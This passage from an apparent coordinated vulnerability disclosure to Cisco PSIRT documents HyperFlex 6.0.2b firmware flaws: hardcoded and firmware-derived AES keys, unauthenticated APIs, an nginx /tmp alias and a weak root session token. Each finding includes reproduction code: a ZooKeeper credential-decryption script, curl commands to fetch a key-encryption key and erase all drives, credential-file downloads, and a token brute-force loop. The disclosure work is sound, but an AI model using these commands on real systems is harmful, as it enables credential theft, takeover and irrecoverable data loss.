\texttt{BasicEncryptionUtil.class}.

The same \texttt{'springpath'} value appears as the TLS keystore password
(\texttt{syslog.keyStorePass}) in \texttt{application.conf}, confirming it is a
project-level constant that has not been rotated. The ZK ACL is
\texttt{OPEN\_ACL\_UNSAFE} (\texttt{world:anyone:cdrwa}): unauthenticated read
from port 2181 is sufficient to retrieve the ciphertext.

\subsection*{Technical Evidence (6.0.2b)}

\begin{lstlisting}
# javap -verbose EsxAuthZKMgmtImpl.class (stMgr-1.0.jar, 6.0.2b):
#496 = Utf8              springpath
#497 = String            #496    // springpath
# bytecode offset 0:  ldc_w #497  // String springpath
# bytecode offset 83: invokevirtual EncryptionUtil$.decryptData
# bytecode offset 98: invokevirtual EncryptionUtil$.decryptData

# javap -verbose BasicEncryptionUtil.class (hxSecuritySvcMgr-1.0.jar, 6.0.2b):
# offset 33: ldc #79  // String AES/ECB/PKCS5Padding

# ZK path (ZKConstants$.class, common-1.0.jar):
# BASE_PATH = "/storvisor2"  SERVICE_NAME_MGR = "stCluster"
# -> /storvisor2/stCluster

# Decrypt any field from the ZK payload:
import hashlib, base64
from Crypto.Cipher import AES

def hxdp_decrypt(b64_ct, key='springpath'):
    k = hashlib.sha256(key.encode()).digest()
    c = base64.b64decode(b64_ct)
    return AES.new(k, AES.MODE_ECB).decrypt(c)

# Read payload from ZK (no auth) and decrypt:
from kazoo.client import KazooClient; import json
zk = KazooClient('<ctlvm>:2181'); zk.start()
payload = json.loads(zk.get('/storvisor2/stCluster')[0])
print(hxdp_decrypt(payload['esx_password']))          # ESXi password
print(hxdp_decrypt(payload['url_vcenter_encrypted_password']))  # vCenter
print(hxdp_decrypt(payload['ucsm_pwd']))              # UCSM
zk.stop()
\end{lstlisting}

\subsection*{Reproduction}

\begin{enumerate}
\item Read \texttt{/storvisor2/stCluster} from ZooKeeper port 2181 without
  credentials.
\item Run \texttt{hxdp\_decrypt(value, 'springpath')} on each encrypted field.
\item Decrypted output includes ESXi password, vCenter password, and UCSM
  password.
\end{enumerate}

\subsection*{Impact}

ESXi admin access on all cluster hypervisors; vCenter admin on the entire
datacenter; UCSM admin controlling physical blades, BMC, and fabric interconnect.
All three credential classes are recoverable from a single unauthenticated
ZooKeeper read.

\subsection*{Remediation}

\begin{enumerate}[noitemsep]
\item Replace the hardcoded \texttt{'springpath'} AES key with a per-deployment
  generated key in a hardware-backed keystore or TPM.
\item Apply restrictive ZK ACLs on \texttt{/storvisor2/*}.
\item Move credential storage out of ZooKeeper into a dedicated secrets manager.
\item Enable ZooKeeper TLS and mutual authentication (ZK 3.5+).
\end{enumerate}

\subsection*{References}

\begin{itemize}[noitemsep]
\item CWE-321: Use of Hard-coded Cryptographic Key ---
  \url{https://cwe.mitre.org/data/definitions/321.html}
\item NIST SP 800-57 Part 1 Rev 5, Section 5.3: Key establishment requirements
\end{itemize}

\bigskip

% =============================================================
\section{HX-F007: Static AES Key Derived from Shipped Firmware File Decrypts All Runtime Cluster Credentials}
% =============================================================

\findingmeta{CWE-321 (Use of Hard-coded Cryptographic Key)}{Network (key derivation requires only the public firmware download)}{High}{High}{None}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{Key derivation confirmed: \texttt{md5sum Secret.class = 1f6d13bcd7753f2d3b2e2da361b7afb5}; mechanism confirmed in \texttt{springpath\_env\_parse.py}}

\subsection*{Plain Language Summary}

HyperFlex encrypts the storage controller root password, SSL keystore password,
and installer password using a key that is derived from a file shipped inside the
firmware package. That file is publicly available in the firmware download. Its
MD5 hash is the encryption key. The key is identical on every single HyperFlex
6.0.2b installation. Anyone who has ever downloaded the firmware knows the
encryption key for all deployed clusters and can decrypt any runtime credential
file they obtain.

\subsection*{Vulnerability Description}

\texttt{springpath\_env\_parse.py} derives the AES-CBC key as
\texttt{md5sum(Secret.class)} in hex-string form. \texttt{Secret.class}
ships in the \texttt{storfs-misc} firmware package at the fixed path
\texttt{/usr/share/hyperflex/storfs-misc/Secret.class}.

\texttt{Secret.class} is a compiled Java class containing a single static long
field (\texttt{secreteKey = 4346757647632874372L}) --- an obscurity measure that
provides no cryptographic protection. The MD5 value of the 6.0.2b copy is
deterministic and was confirmed by direct file hash:

\medskip
\begin{center}
\texttt{md5sum Secret.class = 1f6d13bcd7753f2d3b2e2da361b7afb5}
\end{center}
\medskip

This value is the AES-CBC key on every 6.0.2b installation. Runtime credentials
(\texttt{stctl\_vm\_passwd}, \texttt{ssl\_cert\_passwd},
\texttt{installer\_passwd}) are stored in deployment-generated
\texttt{*.tunes} files encrypted with this key. An attacker who obtains any
runtime tunes file can decrypt it offline using the publicly-derivable key.

\subsection*{Technical Evidence (6.0.2b)}

\begin{lstlisting}[style=python]
# springpath_env_parse.py (storfs-misc_6.0.2b-44423_amd64.deb), verbatim:

def md5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def decrypt(key, enc):
    enc    = base64.b64decode(enc)
    iv     = enc[:16]
    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(enc[16:]))

# Runtime usage:
file_md5 = md5('/usr/share/hyperflex/storfs-misc/Secret.class')
decoded  = decrypt(file_md5, tunes_value)

# Key confirmed static across all 6.0.2b nodes:
# md5sum Secret.class == '1f6d13bcd7753f2d3b2e2da361b7afb5'
\end{lstlisting}

\subsection*{Reproduction}

\begin{enumerate}
\item Extract \texttt{Secret.class} from \texttt{storfs-misc\_6.0.2b-44423\_amd64.deb}.
\item Compute its MD5: \texttt{md5sum Secret.class} yields
  \texttt{1f6d13bcd7753f2d3b2e2da361b7afb5}.
\item Use this value as the AES-CBC key (hex-string encoded).
\item Decrypt any value from a runtime \texttt{springpath\_custom\_node.tunes}
  or \texttt{springpath\_custom\_cluster.tunes} file using the
  \texttt{decrypt()} function above.
\end{enumerate}

\subsection*{Impact}

All runtime cluster credentials encrypted by the tunes mechanism are decryptable
using the publicly-derivable static key. The storage controller root password
is within the \texttt{stctl\_vm\_passwd} field.

\subsection*{Remediation}

\begin{enumerate}[noitemsep]
\item Generate the AES key per-installation at first boot using a CSRNG
  (e.g., PBKDF2 with per-node salt stored in a TPM or kernel keyring).
\item Remove \texttt{Secret.class} from the firmware distribution package ---
  key material must not ship alongside the ciphertext it protects.
\item Rotate all credentials in existing tunes files after patching.
\end{enumerate}

\subsection*{References}

\begin{itemize}[noitemsep]
\item CWE-321: Use of Hard-coded Cryptographic Key ---
  \url{https://cwe.mitre.org/data/definitions/321.html}
\item NIST SP 800-57 Part 1 Rev 5: Key management requirements
\end{itemize}

\bigskip

% =============================================================
\section{HX-F008: Unauthenticated HTTP API on Port 8012 Exposes Drive Cryptographic Erasure and Node Key Encryption Key}
% =============================================================

\findingmeta{CWE-306 (Missing Authentication for Critical Function)}{Network}{High}{None}{High}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{\texttt{strings sedsvc} confirmed all endpoint strings and port 8012}

\subsection*{Plain Language Summary}

A service running on every HyperFlex node manages the self-encrypting drives.
It listens on a network port bound to all interfaces and does not require a
password for any operation. One endpoint --- available to any machine on the
management network with no login --- sends a command to the drives to erase
themselves cryptographically. Data erased this way cannot be recovered. Another
endpoint returns the node's key encryption key over the network to any caller,
enabling decryption of the drive contents.

\subsection*{Vulnerability Description}

\texttt{sedsvc} is a Go HTTP server managing TCG OPAL Self-Encrypting Drive
(SED) operations. It binds to \texttt{0.0.0.0:8012}.
\texttt{main.(*myHandler).ServeHTTP} performs a single URL-to-handler map
lookup and calls the handler directly with no authentication step.

Confirmed endpoints from the 6.0.2b Go symbol table and string table:

\begin{itemize}[noitemsep]
\item \texttt{POST /sec\_erase\_all} $\rightarrow$ \texttt{BMC\_SecureEraseAll}
  $\rightarrow$ \texttt{SEDUTIL\_SecureEraseAll} at \texttt{0x674940} ---
  cryptographic erase of all SED drives; data is irrecoverable
\item \texttt{POST /sec\_erase} $\rightarrow$ erase a specific drive by serial number
\item \texttt{GET /get\_config} $\rightarrow$ returns BMC config including the node
  Key Encryption Key (KEK) as a base64-encoded string
\item \texttt{GET /get\_inventory} $\rightarrow$ per-drive encryption state, serial
  numbers, firmware versions, lock status
\end{itemize}

\subsection*{Technical Evidence (6.0.2b)}

\begin{lstlisting}
# strings sedsvc (storfs-appliance_6.0.2b-44423_amd64.deb):
:8012          # bind address -- all interfaces
sec_erase      # endpoint
sec_erase_all  # endpoint
/get_config    # endpoint
/get_inventory # endpoint
/disk_status   # endpoint

# ServeHTTP dispatch (Go symbol table):
0x666b60: call mapaccess2_faststr(mux, url_path)
0x666b65: test bl, bl    ; found?
0x666b67: je   not_found ; only check: does route exist?
0x666b80: call *rsi      ; call handler -- NO auth gate
0x674940: BMC_SecureEraseAll
\end{lstlisting}

\subsection*{Reproduction}

\begin{lstlisting}[style=shell]
# Retrieve node KEK without credentials:
curl -s http://<ctlvm_ip>:8012/get_config
# -> Response JSON contains nodeKek: "<base64_kek>"

# Cryptographic erase all drives without credentials (CONTROLLED ENV ONLY):
curl -s -X POST http://<ctlvm_ip>:8012/sec_erase_all \
  -H 'Content-Type: application/json' -d '{}'
# -> All SED drives on the node are cryptographically erased; data unrecoverable
\end{lstlisting}

\subsection*{Impact}

Any machine on the management network can cryptographically erase all data on
a cluster node with a single unauthenticated POST request. The same service
exposes the node KEK, enabling offline decryption of drive contents.

\subsection*{Remediation}

\begin{enumerate}[noitemsep]
\item Bind \texttt{sedsvc} to \texttt{127.0.0.1} only, or replace the TCP
  listener with a Unix domain socket.
\item Add authentication (shared secret or bearer token) validated before
  any handler is dispatched.
\item Gate \texttt{/sec\_erase} and \texttt{/sec\_erase\_all} behind an
  additional short-TTL confirmation token to prevent single-packet erasure.
\end{enumerate}

\subsection*{References}

\begin{itemize}[noitemsep]
\item CWE-306: Missing Authentication for Critical Function ---
  \url{https://cwe.mitre.org/data/definitions/306.html}
\item TCG Opal Storage Specification 2.0: section on key management
\end{itemize}

\bigskip

% =============================================================
\section{HX-F009: nginx Port 8997 Binds to All Interfaces and Auto-Injects Admin Session --- No Credentials Required}
% =============================================================

\findingmeta{CWE-284 (Improper Access Control)}{Network}{High}{High}{High}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{\texttt{rest\_internal.conf} confirmed \texttt{listen *:8997 ssl} and \texttt{proxy\_set\_header X-RootSessionID}}

\subsection*{Plain Language Summary}

nginx on HyperFlex listens on port 8997 bound to every network interface and
automatically attaches the administrator session credential to every request it
receives before forwarding that request to the management API. Port 8997 is
not restricted to loopback. Any machine that can reach this port gets full
administrator access to the entire HyperFlex REST API without providing any
login credentials. This is confirmed by the \texttt{stCli} command-line tool,
which uses this port to administer the cluster from remote hosts.

\subsection*{Vulnerability Description}

\texttt{rest\_internal.conf} (from \texttt{storfs-misc}) configures nginx to
listen on port 8997 with \texttt{listen *:PORT ssl} (binding to all network
interfaces) and injects \texttt{proxy\_set\_header X-RootSessionID SESSIONID}
for every proxied request before forwarding to the management API backend at
\texttt{localhost:8000}. The \texttt{proxy\_set\_header} directive overwrites
any client-supplied value, so the attacker's request arrives at the backend
carrying a valid admin session credential automatically provided by nginx.

The \texttt{stCli.sh} script confirms that port 8997 is used for remote
cluster administration: \texttt{springpath\_host=clusterIp; springpath\_port=8997}.

\subsection*{Technical Evidence (6.0.2b)}

\begin{lstlisting}
# rest_internal.conf (storfs-misc_6.0.2b-44423_amd64.deb):
listen *:PORT ssl;                              # line 4 -- all interfaces
proxy_set_header X-RootSessionID SESSIONID;    # line 42
proxy_set_header X-RootSessionID SESSIONID;    # line 72 (stMgr block)

# restintport.cfg:
PORT=8997

# stCli.sh:12 -- remote usage confirmed:
export springpath_host=${clusterIp}
export springpath_port=8997
\end{lstlisting}

\subsection*{Reproduction}

\begin{lstlisting}[style=shell]
# No credentials. Request goes via port 8997 -> nginx injects admin session:
curl -sk https://<ctlvm_ip>:8997/coreapi/v1/clusters
# -> HTTP 200 with full cluster configuration (admin-level response)

curl -sk https://<ctlvm_ip>:8997/rest/v1/nodes
# -> HTTP 200 with all node IPs, serial numbers, and roles
\end{lstlisting}

\subsection*{Impact}

Any machine reachable on port 8997 gets full admin access to the complete
HyperFlex REST API (\texttt{/rest}, \texttt{/coreapi}, \texttt{/encryption},
\texttt{/dataprotection}, \texttt{/backupservice}, \texttt{/stMgr}, and others).

\subsection*{Remediation}

\begin{enumerate}[noitemsep]
\item Change \texttt{listen *:PORT ssl} to \texttt{listen 127.0.0.1:PORT ssl}
  to restrict port 8997 to loopback only.
\item The \texttt{stCli} tool should authenticate against port 443 with
  explicit credentials instead of the privileged proxy port.
\end{enumerate}

\subsection*{References}

\begin{itemize}[noitemsep]
\item CWE-284: Improper Access Control ---
  \url{https://cwe.mitre.org/data/definitions/284.html}
\item OWASP Top 10 A01:2021 --- Broken Access Control
\end{itemize}

\bigskip

% =============================================================
\section{HX-F010: Unauthenticated Access to \texttt{/tmp/} via nginx \texttt{/sbdl/} Path Alias}
% =============================================================

\findingmeta{CWE-284 (Improper Access Control)}{Network}{High}{None}{None}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{\texttt{nginx.conf} confirmed \texttt{location /sbdl/ \{ alias /tmp/; auth\_basic off; \}}}

\subsection*{Plain Language Summary}

The nginx configuration maps the URL \texttt{/sbdl/} directly to the
\texttt{/tmp/} directory on disk and turns off the authentication requirement
for that path. During normal cluster operations --- upgrades and node
replacements --- HyperFlex writes SSH private keys for all storage controllers
and plaintext ESXi passwords into \texttt{/tmp/}. Anyone who can reach the
stCtlVM over the network can download those files by guessing or brute-forcing
the filename, without ever logging in.

\subsection*{Vulnerability Description}

\texttt{nginx.conf} contains: \texttt{location /sbdl/ \{ alias /tmp/;
auth\_basic off; \}}. This exposes the entire \texttt{/tmp/} tree as a
directory served without authentication. During upgrade and node replacement
workflows, the following files are written to \texttt{/tmp/}:

\begin{itemize}[noitemsep]
\item \texttt{/tmp/sshKeyPair*.json} --- SSH private keys for all stCtlVM nodes
  (written by \texttt{generateSshKeys.py}, consumed by upgrade hooks)
\item \texttt{/tmp/upgradeHooksCreds*.json} --- plaintext ESXi username and
  password (used by all upgrade hook scripts)
\item \texttt{/tmp/nodeInventory*.json} --- cluster node topology
\item \texttt{/tmp/clusterConfig*.json} --- cluster configuration data
\end{itemize}

\subsection*{Technical Evidence (6.0.2b)}

\begin{lstlisting}
# nginx.conf (storfs-misc_6.0.2b-44423_amd64.deb):
location /sbdl/ {
    alias /tmp/;
    auth_basic off;
}

# generateSshKeys.py:46 -- SSH keys written to /tmp:
sshKeysFileHandle, sshKeysFile = mkstemp(
    suffix='.json', prefix='sshKeyPair', dir='/tmp')

# commonFunctions.py:645 -- consumers read from /tmp:
credsFile = getMatchingFileName('/tmp/sshKeyPair*.json')

# Upgrade hook:
JSON_CREDS_FILE_MATCH = '/tmp/upgradeHooksCreds*.json'
\end{lstlisting}

\subsection*{Reproduction}

\begin{lstlisting}[style=shell]
# During a cluster upgrade or node replacement, poll for credential files:
# SSH private keys:
curl -sk "http://<ctlvm_ip>/sbdl/sshKeyPair<random>.json"
# -> Returns JSON with SSH private key for all nodes

# ESXi credentials:
curl -sk "http://<ctlvm_ip>/sbdl/upgradeHooksCreds<random>.json"
# -> Returns JSON with ESXi plaintext username and password
\end{lstlisting}

\subsection*{Impact}

SSH private keys for all storage controllers and ESXi plaintext credentials are
downloadable without authentication during cluster maintenance windows.

\subsection*{Remediation}

\begin{enumerate}[noitemsep]
\item Replace the \texttt{/tmp/} alias with a specific pattern matching only
  support bundle archives (e.g.,
  \texttt{location \textasciitilde{} \^{}/sbdl/supportBundle-[a-zA-Z0-9\textunderscore-]+\textbackslash.tar\textbackslash.gz\$}).
\item Move SSH key files and credential files from \texttt{/tmp/} to a
  directory not served by nginx.
\item If \texttt{/tmp/} aliasing is required, restrict access to loopback:
  \texttt{allow 127.0.0.1; deny all}.
\end{enumerate}

\subsection*{References}

\begin{itemize}[noitemsep]
\item CWE-284: Improper Access Control ---
  \url{https://cwe.mitre.org/data/definitions/284.html}
\item CWE-538: File and Directory Information Exposure ---
  \url{https://cwe.mitre.org/data/definitions/538.html}
\end{itemize}

\bigskip

% =============================================================
\section{HX-F011: Root Session Token Generated with 15-bit Entropy and Stored World-Readable}
% =============================================================

\findingmeta{CWE-330 (Use of Insufficiently Random Values)}{Network}{High}{High}{High}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{\texttt{set\_shared\_key.sh} confirmed \texttt{\$RANDOM} and \texttt{chmod 644}}

\subsection*{Plain Language Summary}

HyperFlex generates an internal session token that grants full administrator
access to the management API. The token is created by appending a random number
between 0 and 32,767 to the VM's UUID. The UUID is readable from standard BIOS
interrogation tools. The token is then saved to a file readable by every user on
the system. An attacker who has the UUID can try all 32,768 possible tokens in
under a second to find the valid one. Any local user can read the file directly
without trying.

\subsection*{Vulnerability Description}

\texttt{set\_shared\_key.sh} generates the \texttt{X-RootSessionID} token
used by \texttt{stSSOMgr} and all internal API callers with
\texttt{useRootSessionId=True}:

\begin{center}
\texttt{sharedkey=\$nodeid-\$RANDOM}
\end{center}

Bash \texttt{\$RANDOM} produces integers in $[0,\,32767]$ --- exactly 15 bits,
32,768 possible values. \texttt{nodeid} is the VMware VM UUID from
\texttt{/opt/hyperflex/etc/product\_uuid}, which is discoverable via
\texttt{dmidecode -s system-uuid} (any local user) or via the vCenter/ESXi
management API. The file is then written world-readable:
\texttt{chmod 644 root\_file.pub}.

The token bypasses JWT authentication for certificate management
(\texttt{nginxCertManager.py}), syslog synchronization
(\texttt{synchronizeSyslog.py}), scheduled scripts (\texttt{schScripts.py}),
inventory updates (\texttt{update-inventory.py}), and STIG settings
(\texttt{5997\_stig\_setting\_ESX.py}).

\subsection*{Technical Evidence (6.0.2b)}

\begin{lstlisting}
# set_shared_key.sh (storfs-misc_6.0.2b-44423_amd64.deb), verbatim:
nodeid=$(cat /opt/hyperflex/etc/product_uuid)
sharedkey=$nodeid-$RANDOM           # 15-bit entropy: [0, 32767]
echo $sharedkey > $dest/root_file.pub
chmod 644 $dest/root_file.pub       # world-readable

# StTransportBase.py:26 -- consumer:
X_ROOT_SESSION_ID = open('/etc/hyperflex/secure/root_file.pub').read().strip()

# commonFunctions.py:42 -- header injection:
headers['X-RootSessionID'] = rootSessionId

# Keyspace: 2^15 = 32,768 values; guessable in < 1 second
\end{lstlisting}

\subsection*{Reproduction}

\begin{lstlisting}[style=shell]
# From any local account -- read the token directly:
cat /etc/hyperflex/secure/root_file.pub

# From a remote position with the VM UUID -- brute-force in < 1 second:
UUID=$(cat /opt/hyperflex/etc/product_uuid)   # or via dmidecode
for N in $(seq 0 32767); do
    TOKEN="${UUID}-${N}"
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "X-RootSessionID: ${TOKEN}" \
        http://localhost:8000/rest/v1/cluster)
    [ "$STATUS" = "200" ] && echo "Valid token: $TOKEN" && break
done
\end{lstlisting}

\subsection*{Impact}

Attacker obtains a valid \texttt{X-RootSessionID} token that grants
administrator-equivalent access to the internal HyperFlex management API,
bypassing JWT authentication. From any local account, the token is directly
readable from the filesystem.

\subsection*{Remediation}

\begin{enumerate}[noitemsep]
\item Replace \texttt{\$RANDOM} with a CSRNG:
  \texttt{sharedkey=\$(openssl rand -hex 32)}.
\item Change the file permissions to \texttt{600} (owner-only):
  \texttt{chmod 600 root\_file.pub}.
\item Consider replacing the file-based \texttt{X-RootSessionID} scheme with
  a time-limited token issued by the AAA service.
\end{enumerate}

\subsection*{References}

\begin{itemize}[noitemsep]
\item CWE-330: Use of Insufficiently Random Values ---
  \url{https://cwe.mitre.org/data/definitions/330.html}
\item CWE-732: Incorrect Permission Assignment for Critical Resource ---
  \url{https://cwe.mitre.org/data/definitions/732.html}
\item NIST SP 800-90A Rev 1: Recommendation for Random Number Generation
\end{itemize}

\bigskip

% =============================================================
\section*{Proof of Concept}
% =============================================================

Code demonstrating each finding is available for coordinated review by Cisco
PSIRT. None of the above findings were exercised against live production systems.
All evidence is derived from static analysis of the 6.0.2b firmware package.

Available immediately upon Cisco PSIRT request:

\begin{itemize}[noitemsep]
\item \textbf{HX-F001/F002:} Python Thrift client calling
  \texttt{getDataEncryptionKeys} and \texttt{formatDisks} with zero
  credentials
\item \textbf{HX-F003:} \texttt{curl} command demonstrating unauthenticated
  \texttt{/st-support/*} access with credential observation via netcat listener
\item \textbf{HX-F004:} Python \texttt{kazoo} script writing attacker
  certificate to ZooKeeper and observing nginx restart
\item \textbf{HX-F005:} \texttt{zkCli.sh} read of \texttt{/user\_credentials}
  plus hashcat crack invocation
\item \textbf{HX-F006:} Python decrypt script --- \texttt{hxdp\_decrypt(b64,
  'springpath')} applied to ZK payload
\item \textbf{HX-F007:} Key derivation script plus AES-CBC decrypt skeleton
\item \textbf{HX-F008:} \texttt{curl} commands for \texttt{/get\_config} and
  \texttt{/sec\_erase\_all}
\item \textbf{HX-F009:} \texttt{curl} commands demonstrating full admin API
  access via port 8997
\item \textbf{HX-F010:} \texttt{curl} demonstrating SSH key and credential
  file download from \texttt{/sbdl/}
\item \textbf{HX-F011:} Shell brute-force script plus direct file read
\end{itemize}

% =============================================================
\section*{Disclosure Timeline}
% =============================================================

\begin{tabular}{@{}L{3.5cm}L{10.5cm}@{}}
\toprule
\textbf{Date} & \textbf{Event} \\
\midrule
2026-09-08 & Static firmware analysis completed; all 11 findings confirmed \\
2026-09-08 & PSIRT submission \\
2026-12-07 & Proposed public disclosure date (90 days) \\
\bottomrule
\end{tabular}

\medskip
\noindent
Willing to extend the timeline with documented progress toward a patch.
Requesting acknowledgment within 10 business days per Cisco PSIRT policy.

% =============================================================
\section*{Contact}
% =============================================================

\noindent
Submitted via Cisco PSIRT online portal:
\url{https://tools.cisco.com/security/center/resources/security_vulnerability_policy.html}

\bigskip
\noindent\rule{\linewidth}{0.4pt}
{\small\textit{All analysis performed on publicly distributed firmware.
No production systems were accessed.}}

\end{document}
